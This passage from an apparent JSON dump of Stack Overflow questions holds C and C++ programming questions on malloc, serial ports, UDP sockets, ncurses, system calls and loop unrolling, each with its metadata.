manager).</p>\n\n<p>I made test, added 1kk elements, after adding all, removed one by one all elements (no threads).</p>\n\n<p>Linux - 0.08 seconds</p>\n\n<p>Windows ~57 seconds</p>\n\n<p>Linux(without free) - 0.07 seconds</p>\n\n<p>Windows(without free) - 0.9 seconds</p>\n\n<p>So, the question is, why memory isn't freed in Linux C when no threads are used ?\nI can post code if necessary .</p>\n\n<p>GCC version: 4.4.3</p>\n"},{"tags":["c++","c","serial-port"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":152,"score":0,"question_id":11758210,"title":"Read from serial port without removing from the buffer (linux)","body":"<p>In C/C++</p>\n\n<p>How can I read from serial port, without removing the info I have already read from the buffer?</p>\n\n<p>I want to do something like the Peek function of arduino (<a href=\"http://arduino.cc/en/Serial/Peek\" rel=\"nofollow\">http://arduino.cc/en/Serial/Peek</a>) in a linux machine.</p>\n"},{"tags":["c","malloc"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":108,"score":2,"question_id":13231165,"title":"Free memory after malloc","body":"<p>i have some code:</p>\n\n<pre><code>char * itoa(int a)\n{\n    char (*t)[16]=(char(*)[16])malloc(1*sizeof(char[16]));\n    sprintf(*t,\"%d\",a);\n    return *t;\n}\n// ...\nmvwprintw(my_menu_win,i+1,2,itoa(i));\n</code></pre>\n\n<p>can i free memory from malloc, without add temporary variables?\ne.g:</p>\n\n<pre><code>temp=itoa(i);\nmvwprintw(my_menu_win,i+1,2,temp);\nfree(temp);\n</code></pre>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":75,"score":1,"question_id":13233258,"title":"comparing pointer with integer. How to fix it?","body":"<p>here is piece of my code, I want to check if there are no element next, exit the program. \nbut i get warning of comparing pointer with integer. how i can fix it, cheers.</p>\n\n<p>error is this part\nif(nums[i] == NULL)</p>\n\n<pre><code>/* scanf the file, and store the value in the nums */\nfor(i = 0; i &lt; numOfInt; i++){\n\n   fscanf(f, \"%d\", &amp;nums[i]);\n\n   /* check if the value is too big */ \n   if(nums[i] == NULL){  \n printf(\"arg1 is not equal to nums of element in the file\\n\");\n exit(1);\n   } \n }\n</code></pre>\n"},{"tags":["c","audio","assembly","synthesis"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":51,"score":4,"question_id":13212251,"title":"Data structure for Assembly audio synthesis","body":"<p>I'm writing a simple synth in assembly as a learning project, and I'd like to implement a few more advanced features found on modern synths, namely the ADSR envelope and pulse width modulation using a sine wave. At the moment, I'm basically generating the samples by hand and pushing them to the audio out, which has a sample buffer and an interrupt it produces when the buffer gets near empty.</p>\n\n<p>What I'm stuck on is how to generate a 'continuous' waveform. At the moment, I generate samples for a single instance of a wave (be it saw or pulse), and simply loop that one wave to generate continuous output. As you can imagine, that doesn't scale well to PWM and the ADSR envelope. I, therefore, need to generate the wave on demand, with potential adjustments to it on the fly, such as modulation of the pulse width or pitch (e.g. for legato), but I'm stumped as to how to represent that efficiently in memory, as well how to 'pause' the waveform generation when the buffer has been filled and 'resume' when the interrupt comes along.</p>\n\n<p>I'm not seeking a solution so much as a nudge in the right direction of thinking :-)</p>\n\n<p>Thanks!</p>\n"},{"tags":["c","arm","port","led"],"answer_count":5,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":2948,"score":1,"question_id":1149139,"title":"Steps to make a LED on or off from a C program using Serial Port?","body":"<p>I knew there is a similar post:\n<a href=\"http://stackoverflow.com/questions/209603/steps-to-make-a-led-blink-from-a-c-c-program\">http://stackoverflow.com/questions/209603/steps-to-make-a-led-blink-from-a-c-c-program</a></p>\n\n<p>But now I am working on a arm-based development board, and it seems to have two serial ports that I could use it to make a LED on or off.</p>\n\n<p>Basically I think the flow is , make one pin in serial \"1\" or on and the LED will be turned on and \"0\" to make it off.</p>\n\n<p>Is there some reference code in C-language I could refers?</p>\n"},{"tags":["c","syntax"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":33,"score":1,"question_id":13224893,"title":"C semantics: \"col -= size--\" having ++ or -- operating in an expression","body":"<p>Real short and simple:</p>\n\n<p>say <code>col = 10</code>, <code>size = 8</code>. Then the following is executed:</p>\n\n<pre><code>col -= size--;\n</code></pre>\n\n<p>So does size get subtracted to 7 before doing the subtraction on col (so col = 3)? Or col = 2?</p>\n\n<p>Thanks</p>\n"},{"tags":["c++","c","algorithm","integer"],"answer_count":5,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":185,"score":1,"question_id":13231940,"title":"Find two integers such that their product is close to a given real","body":"<p>I'm looking for an algorithm to find two integer values <code>x,y</code> such that their product is as close as possible to a given double <code>k</code> while their difference is low.</p>\n\n<p><strong>Example</strong>: The area of a rectangle is <code>k=21.5</code> and I want to find the edges length of that rectangle with the constraint that they must be integer, in this case some of the possible solutions are (excluding permutations) <code>(x=4,y=5)</code>,<code>(x=3,y=7)</code> and the stupid solution <code>(x=21,y=1)</code></p>\n\n<p>In fact for the <code>(3,7)</code> couple we have the same difference as for the <code>(21,1)</code> couple</p>\n\n<p><code>21.5-3*7=0.5 = 21.5-21*1</code></p>\n\n<p>while for the <code>(4,5)</code> couple\n<code>21.5-4*5=1.5</code></p>\n\n<p>but the couple <code>(4,5)</code> is preferable because their difference is <code>1</code>, so the rectangle is \"more squared\".</p>\n\n<p>Is there a method to extract those <code>x,y</code> values for which the difference is minimal and the difference of their product to k is also minimal?</p>\n"},{"tags":["c","matrix","pipe","determinants"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":13229776,"title":"Determinant matrix calculating in C through pipe function. revision code","body":"<p>Develop a program is performed using IPC mechanisms one of the following problems: The way - \"Channels.\" Implement the computation of the determinant of a square matrix by expanding it on the determinants of lower order. The \"master\" process sends the job \"driven\" processes but the latter perform a calculation of determinants, and then calculates the result of the main process. In other words, need to use the pipe function. I have a working program but without IPC mechanisms. I don't know about pipe function and how it's working.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;math.h&gt;\n#include&lt;stdlib.h&gt;\n\nint determinant(int n, double mat[n][n])\n{\n    int i,j,i_count,j_count, count=0;\n    double array[n-1][n-1], det=0;\n    if(n==1) return mat[0][0];\n    if(n==2) return (mat[0][0]*mat[1][1] - mat[0][1]*mat[1][0]);\n\n    for(count=0; count&lt;n; count++)\n    {\n        i_count=0;\n        for(i=1; i&lt;n; i++)\n        {\n            j_count=0;\n            for(j=0; j&lt;n; j++)\n            {\n                if(j == count) continue;\n                array[i_count][j_count] = mat[i][j];\n                j_count++;\n            }\n            i_count++;\n        }\n        det += pow(-1, count) * mat[0][count] * determinant(n-1,array);\n    }\n    return det;\n}\n\nint main()\n{\n    int i, j, dim;\n    printf(\"Enter n\\n\");\n    scanf(\"%d\", &amp;dim);\n    double matrix[dim][dim];\n    printf(\"Enter matrix:\\n\");\n    for(i = 0; i &lt; dim; i++)\n    {\n        for(j = 0; j &lt; dim; j++)\n        {\n            scanf(\"%lf \\n\", &amp;matrix[i][j]);\n        }\n    }\n    double x = determinant(dim, matrix);\n    printf(\"Determinant = %g\\n\", x);\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","debugging","source-code"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13231585,"title":"Is it Possible to Debug Complex Source Code in a Debugger?","body":"<p>I like to do step by step analysis on the execution of a <strong>complex source code</strong> working (like using break point, step into etc).</p>\n\n<p>Is it possible to do it in the general compilers/debuggers, like dev C++/Turbo C?'</p>\n\n<p>The source code is <strong>Ngspice</strong> and it is in C.\nThanks</p>\n\n<p><strong>Update:</strong>\nI asked this, because am not sure whether debuggers support debuuging following things in the program: </p>\n\n<ol>\n<li>Threads</li>\n<li>Pipes</li>\n<li>Signal handlers </li>\n<li>Setjmps, etc</li>\n</ol>\n"},{"tags":["c","string","integer","char"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13232158,"title":"How to create time string from integers","body":"<p>I have the following in C:</p>\n\n<pre><code>char time[8];\nint hour= 5;\nint minute = 4;\nint second = 13;\n</code></pre>\n\n<p>The output should be the following;</p>\n\n<pre><code>Output:\n\"05:04:13\" //printf(\"%s\",time);\n</code></pre>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13231101,"title":"Sending and Receiving in UDP in C","body":"<p>The Problem i am facing in ActClientSender when i send the message it Receive at ActServerReceiver and when i Send message in ActSeverSender it Receive the message it self.</p>\n\n<p>struct Sending <em>s=(struct Sending</em>)index; here i am geting the portno and sock_des from ActServerReceiver</p>\n\n<p>here is my code:</p>\n\n<pre><code>void *ActServerSender(void *index)\n{\n    char msg[200];\n    struct sockaddr_in serv_addr;\n    int sock_des = socket(PF_INET,SOCK_DGRAM,0);\n    struct Sending *s=(struct Sending*)index;\n    serv_addr=s-&gt;serv_addr;\n    sock_des=s-&gt;sock_des;\n    printf(\"%d sock des\",sock_des);\n    int sockaddr_len = sizeof(serv_addr);\n\n    printf(\"%d sock des\",sock_des);\n\n    while(1)\n    {\n        int count=0;\n        printf(\"Enter Your Message\\n\");\n        while (scanf(\"%c\", &amp;msg[count]) )\n        {\n            if(msg[count]=='\\n')\n                break;\n            count++;\n        }\n        msg[count]='\\0';\n        printf(\"This message is send:%s\\n\",msg);\n        sendto (sock_des, msg, 200, 0, (struct sockaddr*)&amp;serv_addr, sizeof(serv_addr));\n    }\n}\n\nvoid *ActsenderSender(void *index)\n{   \n    char msg[200];  \n    struct sockaddr_in serv_addr;\n    int sock_des = socket(PF_INET,SOCK_DGRAM,0);\n    struct Sending *s=(struct Sending*)index;\n    serv_addr=s-&gt;serv_addr;\n    sock_des=s-&gt;sock_des;\n\n    int sockaddr_len = sizeof(serv_addr);\n    while(1)\n    {\n        printf(\"yahoooooooooooo!\\n\");   \n        recvfrom(sock_des, msg, 200, 0, (struct sockaddr *)&amp;serv_addr, &amp;sockaddr_len);\n        printf(\"Message Received %s\\n\",msg);\n        fflush(stdout);\n    }   \n}\n\nvoid *ActSenderReceiver(void *port)\n{   \n    pthread_t ActsenderSend;\n    int portno=(int)port;\n    printf(\"Your Port%d\\n\",portno);\n    char msg[200];\n    struct Sending s;\n    struct sockaddr_in serv_addr;\n    int sock_des = socket (AF_INET,SOCK_DGRAM,0);\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons (portno);\n    serv_addr.sin_addr.s_addr = inet_addr (\"127.0.0.1\");\n    s.serv_addr=serv_addr;\n    s.sock_des=sock_des;\n    s.port=portno;\n\n    int j=0;\n    while(1)\n    {\n        if(j==2)\n        {\n            pthread_create( &amp;ActsenderSend , NULL , ActsenderSender , (void*) &amp;s);\n        }\n        int count=0;\n        printf(\"Enter Your Message or say Bye to leave the chat\\n\");\n        while (scanf(\"%c\", &amp;msg[count]) )\n        {\n            if(msg[count]=='\\n')\n                break;\n            count++;\n        }\n\n        msg[count]='\\0';\n        printf(\"This message is send:%s\\n\",msg);\n        if(strcmp(msg,\"Bye\")==0)\n        {\n            clientSender=1;\n        }\n        sendto (sock_des, msg, 200, 0, (struct sockaddr*)&amp;serv_addr, sizeof(serv_addr));\n        j++;\n    }\n}\n\nvoid *ActAsAServerReceive(void *index)\n{\n    char msg[200];\n    int portno=(int)index;\n    //UDP Connection\n    pthread_t ActServerSend;\n    struct Sending s;\n    printf(\"Your Port%d\\n\",portno);\n    struct sockaddr_in serv_addr;\n    int sock_des = socket(PF_INET,SOCK_DGRAM,0);\n\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(portno);\n    serv_addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n    bind(sock_des,(struct sockaddr*)&amp;serv_addr,sizeof(serv_addr));\n    int sockaddr_len = sizeof(serv_addr);\n    s.serv_addr=serv_addr;\n    s.sock_des=sock_des;\n    s.port=portno;\n    int count=0;\n    while(1)\n    {\n        if(count==2)\n        {\n            pthread_create( &amp;ActServerSend , NULL , ActServerSender , (void*) &amp;s);\n            //pthread_join(ActServerSend, NULL);    \n        }   \n        recvfrom(sock_des, msg, 200, 0, (struct sockaddr *)&amp;serv_addr, &amp;sockaddr_len);\n        printf(\"Message Received%s\\n\",msg);\n        fflush(stdout);\n        count++;\n    }\n}\n</code></pre>\n"},{"tags":["c","history","convention"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":2,"view_count":60,"score":-2,"question_id":13232066,"title":"Why use '0x' to represent hexadecimal?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1835465/where-did-the-octal-hex-notations-come-from\">Where did the octal/hex notations come from?</a>  </p>\n</blockquote>\n\n\n\n<p>As asked, Does anybody know why we use '0x' to represent hexadecimal?</p>\n\n<p>By saying 'why', I mean why the inventor (who) of this notation choose '0x' to represent hexadecimal?</p>\n\n<p>Thanks.</p>\n"},{"tags":["c","boolean","standards"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":62,"score":-1,"question_id":13231793,"title":"why is boolean type in C written as _Bool?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/8724349/difference-between-bool-and-bool-types-in-c\">Difference between _Bool and bool types in C?</a>  </p>\n</blockquote>\n\n\n\n<p>I just don't get it.\nFor me, it seems quite unintuitive - compared to simple \"bool\" :)</p>\n\n<p>What were the motives to call it that way?</p>\n"},{"tags":["c","posix","system-calls"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":13219501,"title":"Accessing a system call directly from user program","body":"<p>On Ubuntu - kernel 2.6.32.2</p>\n\n<p>How to call already existing system call from user code directly without help of any library?\nI read in books and on internet to solve this then written following code but still getting error. Please help </p>\n\n<p>Want to find out the process id of current process</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include&lt;linux/unistd.h&gt; // for __NR_getpid\n_syscall0(int, getpid)\n\nint main() {\n printf(\"Current Process ID : %d\\n\",getpid());\n return 0;\n}\n</code></pre>\n\n<p>Error While compilation :</p>\n\n<pre><code>root@Omkant:~/os# gcc -Wall getpid.c -o getpid\ngetpid.c:5:16: error: expected declaration specifiers or ‘...’ before ‘getpid’\ngetpid.c:5:1: warning: data definition has no type or storage class\ngetpid.c:5:1: warning: type defaults to ‘int’ in declaration of ‘_syscall0’\ngetpid.c: In function ‘main’:\ngetpid.c:8:2: warning: implicit declaration of function ‘getpid’\n</code></pre>\n\n<p>What's the problem in the code ? please help...</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":13231046,"title":"Scope of constant and char arrays","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3814719/declaring-an-array-with-a-non-constant-size-variable\">Declaring an array with a non-constant size variable</a>  </p>\n</blockquote>\n\n\n\n<p>This is my code:</p>\n\n<pre><code>const int xsize=150;\nchar Hey[xsize];\n</code></pre>\n\n<p>I don't understand why I cannot declare my new array Hey using the constant above.\nCan anyone help in this?</p>\n"},{"tags":["c++","c","arrays","memory","allocation"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":834,"score":3,"question_id":8027958,"title":"C++ 3d array - dynamic memory allocation aligned in one line","body":"<p>i have a quite weird question which probably has no practical use but the answers bothers me a lot. I tried to mess around today a little bit with arrays and how they are allocated in memory using this code: (Compiler Xcode 4 btw, 4 byte integer)</p>\n\n<pre><code>int ***c;\nint size_x = 0;\nint size_y = 0;\nint size_z = 0;\n\ncout &lt;&lt; \"Enter x: \" &lt;&lt; endl;\ncin &gt;&gt; size_x;\ncout &lt;&lt; \"Enter y: \" &lt;&lt; endl;\ncin &gt;&gt; size_y;\ncout &lt;&lt; \"Enter z: \" &lt;&lt; endl;\ncin &gt;&gt; size_z;\n\nc = new int**[size_x];\nfor (int i = 0; i &lt; size_x; ++i) {\n    *(c+i) = new int*[size_y];\n    for (int j = 0; j &lt; size_y; ++j) {\n        *(*(c+i)+j) = new int[size_z];\n    }\n}\n\nfor (int i = 0; i &lt; size_x; ++i) {\n    for (int j = 0; j &lt; size_y; ++j) {\n        for (int k = 0; k &lt; size_z; ++k) {\n            cout &lt;&lt; (*(*(c+i)+j)+k) &lt;&lt; endl;\n            //cout &lt;&lt; &amp;c[i][j][k] &lt;&lt; endl;\n        }\n    }\n}\n\ndelete [] c;\n</code></pre>\n\n<p>When i enter now: 3, 2 and 4 i get the following output in the console:</p>\n\n<p>0x100100a60\n0x100100a64\n0x100100a68\n0x100100a6c\n0x100100a70\n0x100100a74\n0x100100a78\n0x100100a7c\n0x100100a90\n0x100100a94\n0x100100a98\n0x100100a9c\n0x100100aa0\n0x100100aa4\n0x100100aa8\n0x100100aac\n0x100100ac0\n0x100100ac4\n0x100100ac8\n0x100100acc\n0x100100ad0\n0x100100ad4\n0x100100ad8\n0x100100adc</p>\n\n<p>What my question is now, if we look at the output, than we see that mostly, the memory is aligned every 4 bytes but sometimes we see a bigger step like from 0x100100a7c to\n0x100100a90 .</p>\n\n<p>Is this normal and how can i prevent this? Why is this? Is there a possibility to force c to align my memory as a constant line? (I'm not native english so sorry for that but i don't know how to say it better)</p>\n\n<p>Its just for general understanding :-)</p>\n\n<p>Thank u!</p>\n\n<p>P.S. is it enough to use delete [] once btw or do i have to go through each of the 3 memory blocks and delete [] there the whole array? EDIT: </p>\n\n<p>I delete memory now like this and it works pretty good:</p>\n\n<pre><code>cout &lt;&lt; \"Free Memory\" &lt;&lt; endl;\n\nfor (int i = 0; i &lt; m_sx; ++i) {\n    for (int j = 0; j &lt; m_sy; ++j) {\n        delete [] m_array[i][j];\n        //delete [] (*(*(m_array)+j)+k);\n    }\n    delete [] m_array[i];\n}\n\ndelete [] m_array, m_array = NULL;\n</code></pre>\n"},{"tags":["c","type-conversion"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":13230477,"title":"String to double saving time conversion in c","body":"<p>I'm working on a benchmarking task for an operation (in C language under Linux) and in this operation we use a conversion from string to double a lot (using atof or sscanf functions) but the problem here is that they gave a relatively large time (145, 270 ns respectively) which is not suitable for the operation. So, Do you know any other conversion mechanism that save time?</p>\n\n<p>I tried to use casting but it gave zero</p>\n\n<pre><code>double d;\n\nchar ch[] = \"123.154\";\n\nd = *((double *) ch);\n\nprintf (\"%lf\\n\", d);         // result 0 (compiled using gcc)\n</code></pre>\n\n<p>Regards</p>\n"},{"tags":["c","round"],"answer_count":9,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":126,"score":-1,"question_id":13162292,"title":"Round off whole number in C","body":"<p>I have a number (00-59) in an int and i would like to round it off to 5, for example 06 would be 5 and 08 would be 10. Oh and 07 would also be 10. How would i go about doing this? </p>\n"},{"tags":["c++","c","ubuntu","valgrind","getaddrinfo"],"answer_count":3,"favorite_count":0,"up_vote_count":12,"down_vote_count":0,"view_count":172,"score":12,"question_id":13229913,"title":"getaddrinfo memory leak","body":"<p>I have this code for getting information about IPv4 address:</p>\n\n<pre><code>struct addrinfo hints, *info = NULL;\nchar addr4[INET_ADDRSTRLEN];\n\nmemset(&amp;hints, 0, sizeof(hints));\nhints.ai_socktype = SOCK_STREAM;\nhints.ai_family = AF_INET;\n\nif (!getaddrinfo(argv[hostPara], NULL, &amp;hints, &amp;info)) {\n    inet_ntop(AF_INET, &amp;((const sockaddr_in *)info-&gt;ai_addr)-&gt;sin_addr, addr4, INET_ADDRSTRLEN);\n}\nif (info != NULL) {\n    freeaddrinfo(info);\n}\n</code></pre>\n\n<p>but if I tested argv[hostPara] is \"www.google.com\" I am getting this from valgrind: </p>\n\n<pre><code>==3632== 168 bytes in 1 blocks are still reachable in loss record 1 of 1\n==3632==    at 0x4C2B6CD: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==3632==    by 0x524B5B8: make_request (check_pf.c:249)\n==3632==    by 0x524BA53: __check_pf (check_pf.c:342)\n==3632==    by 0x5201134: getaddrinfo (getaddrinfo.c:2458)\n==3632==    by 0x40186B: main (trace.cc:214)\n</code></pre>\n\n<p>and if <code>argv[hostPara]</code> is <code>\"www.ubuntu.com\"</code> there are no memory leaks. What is this magic behaviour?</p>\n"},{"tags":["c","optimization","cpu-cycles","loop-unrolling"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13229599,"title":"Loop unrolling and its effects on pipelining and CPE (have the solution, but don't understand it)","body":"<p>Below the line is a question on a practice test. The table actually has all the solutions filled in. However, I need clarification upon why the solutions are what they are. (Read the question below the horizontal line).</p>\n\n<p>For example, I would really like to understand the solution row for A2 and A3.</p>\n\n<p>As I see it, you have the following situation going on in A2:</p>\n\n<ol>\n<li>x * y</li>\n<li>xy * r</li>\n<li>xyr * z</li>\n</ol>\n\n<p>Now, let's look at how that'd be in the pipeline:</p>\n\n<pre><code>|1|2|3|4|5|6|7|8 |9|10|11|12|13|14|15|16|17|18|19|20|21|\n| | | | | | | |  | |  |  |  |  |  |  |  |  |  |  |  |  |\n{ x * y } | | |  | |  |  |  |  |  |  |  |  |  |  |  |  |\n        { xy * r } |  |  |  |  |  |  |  |  |  |  |  |  |\n                 { xyr * z  }  |  |  |  |  |  |  |  |  |\n//next iteration, which means different x, y and z's|  |\n                   {x2 * y2    }  |  |  |  |  |  |  |  |\n                               {x2y2 * r   } // this is dependent on both previous r and x2y2\n                                           {x2y2r * z  }\n</code></pre>\n\n<p>So we are able to overlap xyr * z and x2 * y2, because there are no dependency conflicts. However, that is only getting rid of 3 cycles right? </p>\n\n<p>So it would still be (12 - 3) / 3 = 9 / 3 = 3 Cycles Per Element (three elements). <strong>So how are they getting 8/3 CPE for A2?</strong></p>\n\n<p>Any help understanding this concept will be greatly appreciated! There's not a big rush, as the test isn't til next week. If there is any other information you need, please let me know!</p>\n\n<hr>\n\n<p>(Below is the full test question text, along with the table completely filled in with the solutions)</p>\n\n<p>Consider the following function for computing the product of an array of n integers.</p>\n\n<p>We have unrolled the loop by a factor of 3.</p>\n\n<pre><code>int prod(int a[], int n) {\n\nint i, x, y, z;\nint r = 1;\n\nfor(i = 0; i &lt; n-2; i += 3) {\n    x = a[i]; y = a[i+1]; z = a[i+2];\n    r = r * x * y * z; // Product computation\n}\nfor (; i &lt; n; i++)\n    r *= a[i];\n\nreturn r;\n}\n</code></pre>\n\n<p>For the line labeled Product computation, we can use parentheses to create five different\nassociations of the computation, as follows:</p>\n\n<pre><code>r = ((r * x) * y) * z; // A1\nr = (r * (x * y)) * z; // A2\nr = r * ((x * y) * z); // A3\nr = r * (x * (y * z)); // A4\nr = (r * x) * (y * z); // A5\n</code></pre>\n\n<p>We express the performance of the function in terms of the number of cycles per element\n(CPE). As described in the book, this measure assumes the run time, measured in clock\ncycles, for an array of length n is a function of the form Cn + K, where C is the CPE.</p>\n\n<p>We measured the five versions of the function on an Intel Pentium III. Recall that the integer multiplication operation on this machine has a latency of 4 cycles and an issue time of 1 cycle.</p>\n\n<p>The following table shows some values of the CPE, and other values missing. The measured\nCPE values are those that were actually observed. “Theoretical CPE” means that performance\nthat would be achieved if the only limiting factor were the latency and issue time of\nthe integer multiplier.</p>\n\n<p><img src=\"http://i.stack.imgur.com/KaRTU.png\" alt=\"enter image description here\"></p>\n\n<p>Fill in the missing entries. For the missing values of the measured CPE, you can use the\nvalues from other versions that would have the same computational behavior. For the values\nof the theoretical CPE, you can determine the number of cycles that would be required for\nan iteration considering only the latency and issue time of the multiplier, and then divide by 3.</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13227155,"title":"Detecting a RS-232 com port in Linux","body":"<p>I have an ECR(Electronic Cash Register) device,it has a RS-232 com port cable for the connection to PC but I have not been given any drivers for it. I am trying to connect the device to PC but PC is not able to detect the cable. How to detect this device attached on this RS-232? I am working under Linux. Any help on how to find the device is appreciated?</p>\n\n<p>Following is the code snippet I found in C to connect to device based on Baudrate and Com Port number. </p>\n\n<pre><code>int OpenComport(int comport_number, int baudrate)\n\nint SendByte(int comport_number, unsigned char byte)\n\nint SendBuf(int comport_number, unsigned char *buf, int size)\n</code></pre>\n"},{"tags":["c","compiler","notepad++"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13229877,"title":"Installing Notepad++ C complier plugin: linintl-8.dll is missing","body":"<p>Following the instructions on <a href=\"http://iitdu.forumsmotion.com/t108-gcc-compiler-in-notepad\" rel=\"nofollow\">http://iitdu.forumsmotion.com/t108-gcc-compiler-in-notepad</a></p>\n\n<p>However, upon execution of NPPExec with the code provided <strong>(below)</strong>, ld.exe displays a warning detailing that linintl-8.dll is missing.</p>\n\n<pre><code>// The script code, C source code compiling with GNU CC (GCC) in notepad++ (by \"NppExec\" plug-in) and compressing with UPX...\n//\n// Enable? \"//\" signs remove in code line.\n// Sample: C:\\Program Files\\CodeBlocks\\MinGW\\bin\\gcc.exe \"$(FULL_CURRENT_PATH)\" -o $(NAME_PART)\n\nYOUR_GCC\\BIN\\_PATH_HERE\\gcc.exe \"$(FULL_CURRENT_PATH)\" -o $(NAME_PART)\n\n// UPX Compress (with \"--best, --ultra-brute\" options)\n// Enable? \"//\" signs remove in code line.\n// Sample: C:\\WINDOWS\\system32\\upx.exe --best --ultra-brute $(NAME_PART).exe\n\nYOUR_UPX_PATH_HERE\\upx.exe --best --ultra-brute $(NAME_PART).exe\n</code></pre>\n\n<p>Yet, I can see linintl-8.dll sitting in the bin directory of mingw.</p>\n\n<p>Does anybody have any idea how this issue can be resolved, or alternatively an entirely different method to successfully compile C in notepad++ ?</p>\n"},{"tags":["c","ncurses"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13229794,"title":"Regarding No OUPTPUT in ncurses","body":"<p>I am using ncurses to prepare a simple menu in the main window having 5 options and choosing them with the help of arrow keys.At present i had prepared a program to only display a menu in the screen with 5 options only,but some how the output is coming as a blank screen.Please help me out in finding out the error in my code.</p>\n\n<pre><code>#include&lt;ncurses.h&gt;\n#include&lt;stdlib.h&gt;\n//#define ENTER 10\n//#define ESCAPE 27\n\nvoid init_curses()\n{initscr();\nstart_color();\ninit_pair(1,COLOR_WHITE,COLOR_BLUE);\ninit_pair(2,COLOR_BLUE,COLOR_WHITE);\ninit_pair(3,COLOR_RED,COLOR_WHITE);\ncurs_set(0);\nnoecho();\nkeypad(stdscr,TRUE);\n}\n\nvoid draw_mainmenu(WINDOW *mainmenu)\n{ wbkgd(mainmenu,COLOR_PAIR(2));\n  waddstr(mainmenu, \"HELLO THIVNENT\");\n  move(1,0);\n  waddstr(mainmenu, \"HELLO THIVNENT 1\");\nmove( 2,0);\n  waddstr(mainmenu, \"HELLO THIVNENT 2\");\nmove( 3,0);\n  waddstr(mainmenu, \"HELLO THIVNENT 3\");\nmove( 4,0);\n  waddstr(mainmenu, \"HELLO THIVNENT 4\");\nmove( 5,0);\n  waddstr(mainmenu, \"HELLO THIVNENT 5\");\nwattroff(mainmenu,COLOR_PAIR(3));\n}\n\n\nint main()\n{\n  int key;\n  WINDOW *mainmenu;\n  init_curses();\n  bkgd(COLOR_PAIR(1));\n  mainmenu=subwin(stdscr,1,80,0,0);\n  draw_mainmenu(mainmenu);\nsleep(3);\nrefresh();\n\ndelwin(mainmenu);\nendwin();\nreturn 0;\n\n}\n</code></pre>\n"},{"tags":["c++","c","testing","memory-management"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":13229625,"title":"how to convert mib to mb i want to test ram","body":"<p>I am trying to test how much RAM a 32 bit OS supports. </p>\n\n<p><strong>Hi i am converting app from 32 bit os to 64 bit os Just checking looking will 4gb ram is sufficient this is what i want to check</strong> </p>\n\n<p>what all occupies more memory i know pointers will double please help me below program <strong>such that program works for MB not MIB</strong></p>\n\n<p>I tried this program but I am missing some method for the conversion of MiB to MB.</p>\n\n<p>How can I get below program to work?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc,char* argv[]){\n        size_t oneHundredMiB=100*1048576;\n        size_t maxMemMiB=0;\n        void *memPointer = NULL;\n        while((memPointer = malloc(maxMemMiB += oneHundredMiB)) != NULL) {\n                printf(\"Max Tested Memory = %zi\\n\",maxMemMiB);\n                memset(memPointer,0,maxMemMiB);\n                free(memPointer);\n        }\n        printf(\"Max Usable Memory aprox = %zi\\n\",maxMemMiB-oneHundredMiB);\n        return 0;\n}\n</code></pre>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13229682,"title":"C Program sizeof or macro, Something is wrong","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5611724/a-riddle-in-c\">A riddle (in C)</a>  </p>\n</blockquote>\n\n\n\n<p>Can someone please explain what is wrong with this code? </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#define TOTAL_ELEMENTS (sizeof(array) / sizeof(array[0]))\nint array[] = {23,34,12,17,204,99,16};\n\nint main()\n{\n  int d;\n\n  for(d=-1;d &lt;= (TOTAL_ELEMENTS-2);d++)\n      